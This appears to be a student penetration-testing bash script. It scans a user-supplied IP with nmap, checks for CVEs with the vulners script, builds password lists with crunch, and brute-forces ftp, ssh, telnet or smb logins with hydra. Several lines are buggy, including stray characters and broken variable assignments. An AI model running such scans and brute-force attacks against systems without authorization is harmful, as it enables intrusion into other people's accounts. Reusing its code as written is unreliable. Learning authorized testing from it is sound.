#!/bin/bash

## Guy Evenchen - Project 3- Penetration Testing Script ##

# Copyright © Guy_Evenchen 2023

#All rights reserved. This script is the intellectual property of Guy Evenchen. You may use, modify, and distribute this script for educational and non-commercial purposes only. Any unauthorized use, reproduction, or distribution is strictly prohibited. [Your Name] assumes no responsibility for any damages or liabilities arising from the use of this script.

# For inquiries, please contact https://www.linkedin.com/in/guy-evenchen/ .


##########
CURRENT_PATH=$(pwd)
SCAN_FOLDER=$CURRENT_PATH/ScannedSystemsFolder
TIME= $(date | awk '{print $4,$1,$2,$3,$7}') > /dev/null 2>&1
##########

##########################################################

figlet GE PT Script 


## This Part saves all the info that was found by the tools and saving it into a report and zip ##

function Report_FUNCTION(){

Dir_to_zip="$CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress"s
zip -r $EnteredIPAddress  $Dir_to_zip 
echo "We zipped the results into name: $EnteredIPAddress .zip"

echo "Done.. Existing Tool"
sleep 2s
echo "3.."
sleep 1
echo "2.."
sleep 1
echo "1.."
sleep 1
echo "Bye!"
exit
	
}



## This Part for choosing what service login and credentials  to use to crack and connect to system ##

function StartCracking_FUNCTION(){
read -p "[?] What Online service do you want to use? [Form the list above - ftp/ssh/telnet/smb]" UPSERVICE
sleep 1
read -p "[!] Please Enter the UserName" USERNAME
sleep 1
echo "[!] Starting Remote attack [!]"
sudo hydra -l $USERNAME -P $CustomPasswordList  $UPSERVICE $EnteredIPAddress -h $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/HydraPassword.txt

Report_FUNCTION
}





## This function is a Password genarator,the user inputs the letters/numbers to make uniq password or default ##

function Pass_FUNCTION(){
read -p "Do you like to use Default password list? or make your own one? [choose- default/own]" PASSWORDOPTION
case $PASSWORDOPTION in
	default)
		echo "You choosed $PASSWORDOPTION thats fine.. lazy.."
		sleep 1
		StartCracking_FUNCTION
	;;
	
	own)
		echo "You Choosed $PASSWORDOPTION "
		sleep 1
		echo "Starting Crunch Password Maker.."
		sleep 1
		read -p "[?] What is the >minimum characters Length? [Choose:1-9]?" MinPass
		sleep 1
		read -p "[?] What is the <Maximum characters Length? [Choose:1-9]" MaxPass
		sleep 1
		read -p "[?] What it the Password combination do you like to make? [You can use numbers/symbols/characters]" CombinationPass
		sleep 1
		read -p "[?] Do you like to use special symbols/numbers? -Specify Quantity [ @ , % ^ / no ] " Specialcharacters
		
		case $Specialcharacters in
		@)
			echo "You choosed $Specialcharacters - 'lower case characters'"
			crunch $MinPass $MaxPass $Specialcharacters $CombinationPass $Specialcharacters > $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/OwnPassword.txt
			echo "Your own special password has Generated! "
			CustomPasswordList= "$CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/OwnPassword.txt"
			
			StartCracking_FUNCTION
			
			;;
			
		%)
			echo "You choosed $Specialcharacters - 'numbers'"
			crunch $MinPass $MaxPass $Specialcharacters $CombinationPass $Specialcharacters > $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/OwnPassword.txt
			echo "Your own special password has Generated! "
			CustomPasswordList= "$CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/OwnPassword.txt"
			
			StartCracking_FUNCTION
			
			;;
		^)
			echo "You choosed $Specialcharacters - 'symbols'"
			crunch $MinPass $MaxPass $Specialcharacters $CombinationPass $Specialcharacters > $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/OwnPassword.txt
			echo "Your own special password has Generated! "
			CustomPasswordList= "$CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/OwnPassword.txt"
			
			StartCracking_FUNCTION
			
			;;
			
		,)
		
			echo "You choosed $Specialcharacters - 'upper case characters'"
			crunch $MinPass $MaxPass $Specialcharacters $CombinationPass $Specialcharacters > $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/OwnPassword.txt
			echo "Your own special password has Generated! "
			CustomPasswordList="$CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/OwnPassword.txt"
			
			StartCracking_FUNCTION 
		
			;;
			
		no)
		
			echo "You choosed $Specialcharacters,Thats Ok.."
			crunch $MinPass $MaxPass $CombinationPass > $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/OwnPassword.txt
			echo "Your own special password has Generated! "
			CustomPasswordList= "$CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/OwnPassword.txt"
			
			StartCracking_FUNCTION
			
		esac
esac

}


## This Part of the script is asking if you want to brute force the system or not ##

function BruteForce_FUNCTION(){

read -p " Do you Like to Brute Force the system: $EnteredIPAddress ? - [Choose yes/no]" ANSWER
case $ANSWER in
		yes)
			echo "Ok Starting to Brute Force.."
			Pass_FUNCTION
		;;
		
		no)
			echo "As you wish... Champ!"
			sleep 2
			Report_FUNCTION
esac
}


## This Part of the script is checking vulnerabilities via nse script engine,and saving it also to a file ##


function vulnerabilities_FUNCTION() {
    local ip_addresses=("$@")  # Get the array of IP addresses as arguments
    
    echo "[*] Looking for Possible vulnerabilities in - ${ip_addresses[*]}"
    
    for address in "${ip_addresses[@]}"; do
        nmap "$address" --script=vulners.nse -sV >> "$CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/Vulnerabilities__$address.txt"
        
        if grep -q CVE "$CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/Vulnerabilities__$address.txt"; then
            echo "[*] Vulnerabilities found for $address. File saved to - $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/Vulnerabilities_$address.txt."
        else
            echo "[-] No vulnerabilities were found for $address.."
        fi
    done
    
    BruteForce_FUNCTION
}



## This Part is doing ENUMERATION and saving the output to a a file and echo's the results such as ports and OS Version ##

function ENUMERATION_FUNCTION() {
    HOSTS_IPS=$(cat $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/Nmap_Scan.txt  | grep Up | sed 's/(/ /g; s/)/ /g' | awk '{print $2}')
    
    for ip in $HOSTS_IPS; do
        nmap $ip -p- -sV >> $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/Enum_$ip.txt  > /dev/null 2>&1
        sleep 1
    done
    
    PORTS=$(cat $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/Enum_$ip.txt | grep open | wc -l)
    echo "[*] Found $PORTS open ports for - $EnteredIPAddress"
    
    if grep -q OS: "$CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/Nmap_Scan.txt"; then 
        echo "OS"
    else
        echo "[-] Couldn't recognize the OS being used by the device.."
    fi
    
    vulnerabilities_FUNCTION
}


## This Part of the script checks if the Dir existed if yes, we the ask form the user for an IP address and starting scanning the ip and range and the open ports via Nmap #

function StartingTools_FUNCTION() {
    if [ -d "$SCAN_FOLDER/ScannedSystemsFolder" ]; then
        echo "[!] Please Enter your desired IP to Start Scanning: [!] "
        read EnteredIPAddress
        echo "[*] Showing IP Range and few more Details: [*] "
        ipcalc $EnteredIPAddress | awk '{print $1$2}' | tail -6
        cd $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress
        sudo nmap $EnteredIPAddress -p- -O -oG $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/Nmap_Scan.txt > /dev/null 2>&1
        echo "[*] Total hosts UP: $(grep Up $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/Nmap_Scan.txt | sed 's/(/ /g; s/)/ /g' | wc -l)"
        grep Up $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress/Nmap_Scan.txt | sed 's/(/ /g; s/)/ /g'
        
        ENUMERATION_FUNCTION 
        
    else
        mkdir -p $CURRENT_PATH/ScannedSystemsFolder/Scanned_IP_$EnteredIPAddress
        StartingTools_FUNCTION
    fi
}
S
## This First Part of the script that checking if the hacking programs are installed and if not,installing and show path of folder ##

function ToolsInstallations_FUNCTION(){
echo "[!] Starting Scanning & PT Script.. Please Wait :) [!]"
sleep 1
echo "[!] Your Current Path is: $(pwd) [!]" 
sleep 1
echo "[+] Created new Directory in current Path: 'ScannedSystemsFolder' [+]"
mkdir -p $CURRENT_PATH/ScannedSystemsFolder > /dev/null 2>&1
cd $CURRENT_PATH/ScannedSystemsFolder > /dev/null 2>&1
echo "[+] Installing some Tools and Exploit-DataBase (it can take a while) [+]"
if [	-d "$CURRENT_PATH/ScannedSystemsFolder/exploit-database"	]
then
	echo "[*] Tools already installed..[*]"
	StartingTools_FUNCTION
else
	git clone https://github.com/offensive-security/exploit-database.git  > /dev/null 2>&1
	#sudo apt-get -y install exploitdb > /dev/null 2>&1
	#sudo apt-get -y install medusa    > /dev/null 2>&1
	#sudo apt-get -y install masscan   > /dev/null 2>&1
	#sudo apt-get -y install hydra     > /dev/null 2>&1
	echo "[!] Download Finished ... Restarting Script [!]"
	StartingTools_FUNCTION

fi
}

ToolsInstallations_FUNCTION


